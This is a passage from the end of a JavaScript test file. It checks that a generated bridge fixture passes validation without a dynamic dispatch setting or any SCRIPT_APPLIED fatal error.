    const result = validateGeneratedBridge(VALID_BRIDGE, baseManifest);
    expect(VALID_BRIDGE).not.toContain("dispatch: 'dynamic'");
    expect(result.fatal.filter((f) => /SCRIPT_APPLIED/.test(f))).toEqual([]);
  });
});
